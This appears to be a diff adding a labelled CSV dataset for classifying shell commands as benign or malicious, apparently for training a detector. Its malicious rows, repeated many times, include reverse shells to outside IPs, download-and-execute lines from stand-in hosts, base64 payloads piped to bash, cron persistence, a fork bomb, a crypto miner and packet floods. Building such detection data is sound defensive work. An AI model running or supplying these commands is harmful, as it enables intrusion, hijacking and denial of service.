@@ -1,0 +1,811 @@
+text,label
+cat /etc/nginx/nginx.conf,0
+:(){ :|:& };:,1
+t50 10.0.0.1 --flood,1
+tail -f access.log,0
+python3 manage.py runserver,0
+tail -f access.log,0
+grep error app.log,0
+python3 manage.py runserver,0
+echo hello,0
+nginx -g daemon off;,0
+nginx -g daemon off;,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+cd /app && npm start,0
+df -h,0
+base64 -d payload|bash,1
+curl -s http://localhost/health,0
+apt-get update,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+df -h,0
+ls -la /var/log,0
+tail -f access.log,0
+ls -la /var/log,0
+tail -f access.log,0
+df -h,0
+apt-get update,0
+for((;;)); do curl victim; done,1
+:(){ :|:& };:,1
+base64 -d payload|bash,1
+tail -f access.log,0
+apt-get update,0
+hping3 --flood -S -p 80 10.0.0.5,1
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+ps aux,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+for((;;)); do curl victim; done,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+systemctl status nginx,0
+echo hello,0
+tail -f access.log,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+python3 manage.py runserver,0
+grep error app.log,0
+grep error app.log,0
+t50 10.0.0.1 --flood,1
+systemctl status nginx,0
+cat /etc/nginx/nginx.conf,0
+python3 manage.py runserver,0
+nginx -g daemon off;,0
+systemctl status nginx,0
+cd /app && npm start,0
+:(){ :|:& };:,1
+cat /etc/nginx/nginx.conf,0
+grep error app.log,0
+t50 10.0.0.1 --flood,1
+kubectl get pods,0
+ps aux,0
+cat /etc/nginx/nginx.conf,0
+base64 -d payload|bash,1
+redis-cli ping,0
+df -h,0
+:(){ :|:& };:,1
+curl http://evil/x|sh,1
+echo hello,0
+ls -la /var/log,0
+chmod +x /dev/shm/miner,1
+nginx -g daemon off;,0
+echo hello,0
+grep error app.log,0
+chmod +x /dev/shm/miner,1
+hping3 --flood -S -p 80 10.0.0.5,1
+chmod +x /dev/shm/miner,1
+nc -e /bin/sh 45.9.1.2 4444,1
+:(){ :|:& };:,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+curl -s http://localhost/health,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+nc -e /bin/sh 45.9.1.2 4444,1
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+chmod +x /dev/shm/miner,1
+nc -e /bin/sh 45.9.1.2 4444,1
+grep error app.log,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+xmrig -o stratum+tcp://pool:3333,1
+cd /app && npm start,0
+hping3 --flood -S -p 80 10.0.0.5,1
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+nc -e /bin/sh 45.9.1.2 4444,1
+systemctl status nginx,0
+df -h,0
+df -h,0
+python3 manage.py runserver,0
+apt-get update,0
+for((;;)); do curl victim; done,1
+xmrig -o stratum+tcp://pool:3333,1
+systemctl status nginx,0
+grep error app.log,0
+curl -s http://localhost/health,0
+redis-cli ping,0
+systemctl status nginx,0
+redis-cli ping,0
+ls -la /var/log,0
+redis-cli ping,0
+cd /app && npm start,0
+base64 -d payload|bash,1
+kubectl get pods,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+grep error app.log,0
+redis-cli ping,0
+grep error app.log,0
+nginx -g daemon off;,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+apt-get update,0
+chmod +x /dev/shm/miner,1
+grep error app.log,0
+base64 -d payload|bash,1
+curl http://evil/x|sh,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+hping3 --flood -S -p 80 10.0.0.5,1
+df -h,0
+nginx -g daemon off;,0
+curl -s http://localhost/health,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+base64 -d payload|bash,1
+ps aux,0
+hping3 --flood -S -p 80 10.0.0.5,1
+nginx -g daemon off;,0
+t50 10.0.0.1 --flood,1
+hping3 --flood -S -p 80 10.0.0.5,1
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+python3 manage.py runserver,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+t50 10.0.0.1 --flood,1
+nc -e /bin/sh 45.9.1.2 4444,1
+redis-cli ping,0
+xmrig -o stratum+tcp://pool:3333,1
+nginx -g daemon off;,0
+t50 10.0.0.1 --flood,1
+cat /etc/nginx/nginx.conf,0
+tail -f access.log,0
+df -h,0
+echo hello,0
+hping3 --flood -S -p 80 10.0.0.5,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+ps aux,0
+chmod +x /dev/shm/miner,1
+nc -e /bin/sh 45.9.1.2 4444,1
+xmrig -o stratum+tcp://pool:3333,1
+chmod +x /dev/shm/miner,1
+nc -e /bin/sh 45.9.1.2 4444,1
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+cat /etc/nginx/nginx.conf,0
+tail -f access.log,0
+curl http://evil/x|sh,1
+cat /etc/nginx/nginx.conf,0
+xmrig -o stratum+tcp://pool:3333,1
+nc -e /bin/sh 45.9.1.2 4444,1
+python3 manage.py runserver,0
+apt-get update,0
+curl http://evil/x|sh,1
+ps aux,0
+chmod +x /dev/shm/miner,1
+for((;;)); do curl victim; done,1
+systemctl status nginx,0
+redis-cli ping,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+apt-get update,0
+nc -e /bin/sh 45.9.1.2 4444,1
+python3 manage.py runserver,0
+tail -f access.log,0
+nginx -g daemon off;,0
+base64 -d payload|bash,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+ls -la /var/log,0
+xmrig -o stratum+tcp://pool:3333,1
+t50 10.0.0.1 --flood,1
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+:(){ :|:& };:,1
+nc -e /bin/sh 45.9.1.2 4444,1
+kubectl get pods,0
+ps aux,0
+base64 -d payload|bash,1
+df -h,0
+xmrig -o stratum+tcp://pool:3333,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+chmod +x /dev/shm/miner,1
+t50 10.0.0.1 --flood,1
+redis-cli ping,0
+for((;;)); do curl victim; done,1
+systemctl status nginx,0
+kubectl get pods,0
+:(){ :|:& };:,1
+cat /etc/nginx/nginx.conf,0
+systemctl status nginx,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+t50 10.0.0.1 --flood,1
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+xmrig -o stratum+tcp://pool:3333,1
+t50 10.0.0.1 --flood,1
+df -h,0
+apt-get update,0
+nginx -g daemon off;,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+grep error app.log,0
+chmod +x /dev/shm/miner,1
+tail -f access.log,0
+cd /app && npm start,0
+:(){ :|:& };:,1
+ps aux,0
+xmrig -o stratum+tcp://pool:3333,1
+ls -la /var/log,0
+ps aux,0
+tail -f access.log,0
+for((;;)); do curl victim; done,1
+kubectl get pods,0
+ps aux,0
+echo hello,0
+curl -s http://localhost/health,0
+df -h,0
+base64 -d payload|bash,1
+hping3 --flood -S -p 80 10.0.0.5,1
+nginx -g daemon off;,0
+kubectl get pods,0
+apt-get update,0
+chmod +x /dev/shm/miner,1
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+cd /app && npm start,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+cat /etc/nginx/nginx.conf,0
+echo hello,0
+:(){ :|:& };:,1
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+cd /app && npm start,0
+df -h,0
+for((;;)); do curl victim; done,1
+:(){ :|:& };:,1
+:(){ :|:& };:,1
+echo hello,0
+ls -la /var/log,0
+hping3 --flood -S -p 80 10.0.0.5,1
+:(){ :|:& };:,1
+cat /etc/nginx/nginx.conf,0
+nc -e /bin/sh 45.9.1.2 4444,1
+for((;;)); do curl victim; done,1
+:(){ :|:& };:,1
+:(){ :|:& };:,1
+base64 -d payload|bash,1
+ls -la /var/log,0
+base64 -d payload|bash,1
+curl http://evil/x|sh,1
+apt-get update,0
+python3 manage.py runserver,0
+systemctl status nginx,0
+curl http://evil/x|sh,1
+xmrig -o stratum+tcp://pool:3333,1
+t50 10.0.0.1 --flood,1
+base64 -d payload|bash,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+systemctl status nginx,0
+:(){ :|:& };:,1
+systemctl status nginx,0
+systemctl status nginx,0
+hping3 --flood -S -p 80 10.0.0.5,1
+:(){ :|:& };:,1
+grep error app.log,0
+t50 10.0.0.1 --flood,1
+nginx -g daemon off;,0
+nc -e /bin/sh 45.9.1.2 4444,1
+apt-get update,0
+hping3 --flood -S -p 80 10.0.0.5,1
+t50 10.0.0.1 --flood,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+df -h,0
+systemctl status nginx,0
+cat /etc/nginx/nginx.conf,0
+for((;;)); do curl victim; done,1
+echo hello,0
+nc -e /bin/sh 45.9.1.2 4444,1
+redis-cli ping,0
+nginx -g daemon off;,0
+for((;;)); do curl victim; done,1
+echo hello,0
+tail -f access.log,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+df -h,0
+df -h,0
+t50 10.0.0.1 --flood,1
+hping3 --flood -S -p 80 10.0.0.5,1
+base64 -d payload|bash,1
+cd /app && npm start,0
+kubectl get pods,0
+systemctl status nginx,0
+ps aux,0
+ps aux,0
+tail -f access.log,0
+kubectl get pods,0
+for((;;)); do curl victim; done,1
+t50 10.0.0.1 --flood,1
+ls -la /var/log,0
+curl http://evil/x|sh,1
+python3 manage.py runserver,0
+xmrig -o stratum+tcp://pool:3333,1
+df -h,0
+python3 manage.py runserver,0
+df -h,0
+nc -e /bin/sh 45.9.1.2 4444,1
+chmod +x /dev/shm/miner,1
+curl http://evil/x|sh,1
+systemctl status nginx,0
+nginx -g daemon off;,0
+chmod +x /dev/shm/miner,1
+nginx -g daemon off;,0
+redis-cli ping,0
+curl http://evil/x|sh,1
+cat /etc/nginx/nginx.conf,0
+apt-get update,0
+apt-get update,0
+apt-get update,0
+python3 manage.py runserver,0
+t50 10.0.0.1 --flood,1
+cd /app && npm start,0
+base64 -d payload|bash,1
+hping3 --flood -S -p 80 10.0.0.5,1
+cd /app && npm start,0
+cat /etc/nginx/nginx.conf,0
+cat /etc/nginx/nginx.conf,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+redis-cli ping,0
+cd /app && npm start,0
+tail -f access.log,0
+systemctl status nginx,0
+curl http://evil/x|sh,1
+xmrig -o stratum+tcp://pool:3333,1
+chmod +x /dev/shm/miner,1
+redis-cli ping,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+cat /etc/nginx/nginx.conf,0
+for((;;)); do curl victim; done,1
+tail -f access.log,0
+curl -s http://localhost/health,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+apt-get update,0
+hping3 --flood -S -p 80 10.0.0.5,1
+ps aux,0
+chmod +x /dev/shm/miner,1
+nginx -g daemon off;,0
+kubectl get pods,0
+curl -s http://localhost/health,0
+for((;;)); do curl victim; done,1
+apt-get update,0
+base64 -d payload|bash,1
+tail -f access.log,0
+base64 -d payload|bash,1
+nginx -g daemon off;,0
+curl -s http://localhost/health,0
+t50 10.0.0.1 --flood,1
+chmod +x /dev/shm/miner,1
+curl -s http://localhost/health,0
+curl http://evil/x|sh,1
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+nginx -g daemon off;,0
+redis-cli ping,0
+kubectl get pods,0
+xmrig -o stratum+tcp://pool:3333,1
+cd /app && npm start,0
+cat /etc/nginx/nginx.conf,0
+redis-cli ping,0
+curl -s http://localhost/health,0
+for((;;)); do curl victim; done,1
+nc -e /bin/sh 45.9.1.2 4444,1
+for((;;)); do curl victim; done,1
+nginx -g daemon off;,0
+xmrig -o stratum+tcp://pool:3333,1
+kubectl get pods,0
+curl -s http://localhost/health,0
+hping3 --flood -S -p 80 10.0.0.5,1
+hping3 --flood -S -p 80 10.0.0.5,1
+nc -e /bin/sh 45.9.1.2 4444,1
+kubectl get pods,0
+ps aux,0
+chmod +x /dev/shm/miner,1
+grep error app.log,0
+redis-cli ping,0
+python3 manage.py runserver,0
+cd /app && npm start,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+grep error app.log,0
+grep error app.log,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+tail -f access.log,0
+kubectl get pods,0
+kubectl get pods,0
+grep error app.log,0
+redis-cli ping,0
+nginx -g daemon off;,0
+kubectl get pods,0
+nginx -g daemon off;,0
+chmod +x /dev/shm/miner,1
+chmod +x /dev/shm/miner,1
+hping3 --flood -S -p 80 10.0.0.5,1
+ps aux,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+cd /app && npm start,0
+nginx -g daemon off;,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+df -h,0
+t50 10.0.0.1 --flood,1
+hping3 --flood -S -p 80 10.0.0.5,1
+ls -la /var/log,0
+cd /app && npm start,0
+curl -s http://localhost/health,0
+base64 -d payload|bash,1
+cat /etc/nginx/nginx.conf,0
+base64 -d payload|bash,1
+xmrig -o stratum+tcp://pool:3333,1
+nc -e /bin/sh 45.9.1.2 4444,1
+chmod +x /dev/shm/miner,1
+cat /etc/nginx/nginx.conf,0
+df -h,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+ps aux,0
+cat /etc/nginx/nginx.conf,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+curl -s http://localhost/health,0
+t50 10.0.0.1 --flood,1
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+grep error app.log,0
+nginx -g daemon off;,0
+chmod +x /dev/shm/miner,1
+cat /etc/nginx/nginx.conf,0
+cat /etc/nginx/nginx.conf,0
+curl -s http://localhost/health,0
+ls -la /var/log,0
+ls -la /var/log,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+ps aux,0
+ls -la /var/log,0
+cd /app && npm start,0
+python3 manage.py runserver,0
+apt-get update,0
+grep error app.log,0
+curl http://evil/x|sh,1
+redis-cli ping,0
+ls -la /var/log,0
+echo hello,0
+t50 10.0.0.1 --flood,1
+curl -s http://localhost/health,0
+ps aux,0
+redis-cli ping,0
+:(){ :|:& };:,1
+ls -la /var/log,0
+curl -s http://localhost/health,0
+cd /app && npm start,0
+for((;;)); do curl victim; done,1
+curl http://evil/x|sh,1
+xmrig -o stratum+tcp://pool:3333,1
+kubectl get pods,0
+echo hello,0
+ls -la /var/log,0
+apt-get update,0
+python3 manage.py runserver,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+echo hello,0
+nginx -g daemon off;,0
+:(){ :|:& };:,1
+redis-cli ping,0
+base64 -d payload|bash,1
+ls -la /var/log,0
+systemctl status nginx,0
+nginx -g daemon off;,0
+kubectl get pods,0
+grep error app.log,0
+base64 -d payload|bash,1
+:(){ :|:& };:,1
+chmod +x /dev/shm/miner,1
+hping3 --flood -S -p 80 10.0.0.5,1
+ps aux,0
+t50 10.0.0.1 --flood,1
+cat /etc/nginx/nginx.conf,0
+python3 manage.py runserver,0
+curl http://evil/x|sh,1
+cat /etc/nginx/nginx.conf,0
+:(){ :|:& };:,1
+echo hello,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+apt-get update,0
+curl -s http://localhost/health,0
+curl -s http://localhost/health,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+echo hello,0
+tail -f access.log,0
+curl http://evil/x|sh,1
+echo hello,0
+curl http://evil/x|sh,1
+ps aux,0
+kubectl get pods,0
+ls -la /var/log,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+grep error app.log,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+curl -s http://localhost/health,0
+tail -f access.log,0
+apt-get update,0
+grep error app.log,0
+ls -la /var/log,0
+ls -la /var/log,0
+python3 manage.py runserver,0
+nc -e /bin/sh 45.9.1.2 4444,1
+cd /app && npm start,0
+xmrig -o stratum+tcp://pool:3333,1
+ps aux,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+xmrig -o stratum+tcp://pool:3333,1
+systemctl status nginx,0
+:(){ :|:& };:,1
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+t50 10.0.0.1 --flood,1
+redis-cli ping,0
+grep error app.log,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+curl http://evil/x|sh,1
+for((;;)); do curl victim; done,1
+xmrig -o stratum+tcp://pool:3333,1
+chmod +x /dev/shm/miner,1
+kubectl get pods,0
+hping3 --flood -S -p 80 10.0.0.5,1
+redis-cli ping,0
+ps aux,0
+df -h,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+echo hello,0
+curl http://evil/x|sh,1
+echo hello,0
+curl http://evil/x|sh,1
+for((;;)); do curl victim; done,1
+:(){ :|:& };:,1
+nginx -g daemon off;,0
+t50 10.0.0.1 --flood,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+ls -la /var/log,0
+for((;;)); do curl victim; done,1
+systemctl status nginx,0
+python3 manage.py runserver,0
+hping3 --flood -S -p 80 10.0.0.5,1
+systemctl status nginx,0
+:(){ :|:& };:,1
+df -h,0
+hping3 --flood -S -p 80 10.0.0.5,1
+nc -e /bin/sh 45.9.1.2 4444,1
+for((;;)); do curl victim; done,1
+chmod +x /dev/shm/miner,1
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+kubectl get pods,0
+base64 -d payload|bash,1
+python3 manage.py runserver,0
+ps aux,0
+for((;;)); do curl victim; done,1
+:(){ :|:& };:,1
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+for((;;)); do curl victim; done,1
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+curl -s http://localhost/health,0
+ls -la /var/log,0
+ps aux,0
+ls -la /var/log,0
+echo hello,0
+curl http://evil/x|sh,1
+nc -e /bin/sh 45.9.1.2 4444,1
+curl -s http://localhost/health,0
+cd /app && npm start,0
+t50 10.0.0.1 --flood,1
+xmrig -o stratum+tcp://pool:3333,1
+hping3 --flood -S -p 80 10.0.0.5,1
+hping3 --flood -S -p 80 10.0.0.5,1
+chmod +x /dev/shm/miner,1
+nc -e /bin/sh 45.9.1.2 4444,1
+python3 manage.py runserver,0
+systemctl status nginx,0
+tail -f access.log,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+systemctl status nginx,0
+python3 manage.py runserver,0
+systemctl status nginx,0
+cat /etc/nginx/nginx.conf,0
+tail -f access.log,0
+for((;;)); do curl victim; done,1
+ls -la /var/log,0
+base64 -d payload|bash,1
+curl http://evil/x|sh,1
+kubectl get pods,0
+grep error app.log,0
+python3 manage.py runserver,0
+cd /app && npm start,0
+for((;;)); do curl victim; done,1
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+systemctl status nginx,0
+df -h,0
+echo hello,0
+redis-cli ping,0
+tail -f access.log,0
+redis-cli ping,0
+kubectl get pods,0
+systemctl status nginx,0
+ls -la /var/log,0
+df -h,0
+base64 -d payload|bash,1
+nc -e /bin/sh 45.9.1.2 4444,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+xmrig -o stratum+tcp://pool:3333,1
+redis-cli ping,0
+:(){ :|:& };:,1
+echo hello,0
+cat /etc/nginx/nginx.conf,0
+cat /etc/nginx/nginx.conf,0
+ps aux,0
+echo hello,0
+apt-get update,0
+systemctl status nginx,0
+:(){ :|:& };:,1
+redis-cli ping,0
+for((;;)); do curl victim; done,1
+curl http://evil/x|sh,1
+:(){ :|:& };:,1
+chmod +x /dev/shm/miner,1
+xmrig -o stratum+tcp://pool:3333,1
+redis-cli ping,0
+grep error app.log,0
+base64 -d payload|bash,1
+t50 10.0.0.1 --flood,1
+echo hello,0
+cat /etc/nginx/nginx.conf,0
+tail -f access.log,0
+xmrig -o stratum+tcp://pool:3333,1
+kubectl get pods,0
+grep error app.log,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+curl -s http://localhost/health,0
+nc -e /bin/sh 45.9.1.2 4444,1
+curl http://evil/x|sh,1
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+nginx -g daemon off;,0
+xmrig -o stratum+tcp://pool:3333,1
+cd /app && npm start,0
+python3 manage.py runserver,0
+:(){ :|:& };:,1
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+ps aux,0
+cd /app && npm start,0
+curl http://evil/x|sh,1
+cat /etc/nginx/nginx.conf,0
+curl -s http://localhost/health,0
+python3 manage.py runserver,0
+curl -s http://localhost/health,0
+nc -e /bin/sh 45.9.1.2 4444,1
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+redis-cli ping,0
+chmod +x /dev/shm/miner,1
+cd /app && npm start,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+curl -s http://localhost/health,0
+systemctl status nginx,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+cd /app && npm start,0
+echo hello,0
+xmrig -o stratum+tcp://pool:3333,1
+for((;;)); do curl victim; done,1
+ps aux,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+grep error app.log,0
+grep error app.log,0
+chmod +x /dev/shm/miner,1
+cat /etc/nginx/nginx.conf,0
+ls -la /var/log,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+ls -la /var/log,0
+hping3 --flood -S -p 80 10.0.0.5,1
+hping3 --flood -S -p 80 10.0.0.5,1
+curl -s http://localhost/health,0
+chmod +x /dev/shm/miner,1
+redis-cli ping,0
+nc -e /bin/sh 45.9.1.2 4444,1
+kubectl get pods,0
+ps aux,0
+cat /etc/nginx/nginx.conf,0
+cd /app && npm start,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+hping3 --flood -S -p 80 10.0.0.5,1
+nc -e /bin/sh 45.9.1.2 4444,1
+nc -e /bin/sh 45.9.1.2 4444,1
+kubectl get pods,0
+base64 -d payload|bash,1
+kubectl get pods,0
+kubectl get pods,0
+curl http://evil/x|sh,1
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+apt-get update,0
+nginx -g daemon off;,0
+df -h,0
+cd /app && npm start,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+nc -e /bin/sh 45.9.1.2 4444,1
+curl -s http://localhost/health,0
+curl http://evil/x|sh,1
+python3 manage.py runserver,0
+curl -s http://localhost/health,0
+ls -la /var/log,0
+hping3 --flood -S -p 80 10.0.0.5,1
+xmrig -o stratum+tcp://pool:3333,1
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+apt-get update,0
+:(){ :|:& };:,1
+hping3 --flood -S -p 80 10.0.0.5,1
+df -h,0
+base64 -d payload|bash,1
+chmod +x /dev/shm/miner,1
+curl -s http://localhost/health,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+python3 manage.py runserver,0
+cd /app && npm start,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+curl http://evil/x|sh,1
+systemctl status nginx,0
+tail -f access.log,0
+for((;;)); do curl victim; done,1
+df -h,0
+echo hello,0
+cd /app && npm start,0
+cd /app && npm start,0
+nc -e /bin/sh 45.9.1.2 4444,1
+tail -f access.log,0
+ps aux,0
+apt-get update,0
+cd /app && npm start,0
+for((;;)); do curl victim; done,1
+xmrig -o stratum+tcp://pool:3333,1
+apt-get update,0
+hping3 --flood -S -p 80 10.0.0.5,1
+grep error app.log,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+tail -f access.log,0
+apt-get update,0
+nginx -g daemon off;,0
+df -h,0
+grep error app.log,0
+:(){ :|:& };:,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+curl -s http://localhost/health,0
+tail -f access.log,0
+df -h,0
+xmrig -o stratum+tcp://pool:3333,1
+tail -f access.log,0
+echo hello,0
+df -h,0
+ps aux,0
+df -h,0
+t50 10.0.0.1 --flood,1
+for((;;)); do curl victim; done,1
+ps aux,0
+kubectl get pods,0
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+t50 10.0.0.1 --flood,1
+kubectl get pods,0
+wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
+apt-get update,0
+echo hello,0
+echo hello,0
+xmrig -o stratum+tcp://pool:3333,1
+xmrig -o stratum+tcp://pool:3333,1
+nginx -g daemon off;,0
+echo hello,0
+python3 manage.py runserver,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+python3 manage.py runserver,0
+base64 -d payload|bash,1
+apt-get update,0
+base64 -d payload|bash,1
+python3 manage.py runserver,0
+t50 10.0.0.1 --flood,1
+base64 -d payload|bash,1
+redis-cli ping,0
+nc -e /bin/sh 45.9.1.2 4444,1
+t50 10.0.0.1 --flood,1
+curl http://evil/x|sh,1
+tail -f access.log,0
+curl http://evil/x|sh,1
+apt-get update,0
+tail -f access.log,0
+systemctl status nginx,0
+kubectl get pods,0
+redis-cli ping,0
+curl http://evil/x|sh,1
+crontab -l; echo '* * * * * /tmp/x' | crontab -,1
+grep error app.log,0
+python3 manage.py runserver,0
+bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
+t50 10.0.0.1 --flood,1
+base64 -d payload|bash,1
+ls -la /var/log,0
+apt-get update,0
+ls -la /var/log,0
+echo hello,0
+for((;;)); do curl victim; done,1
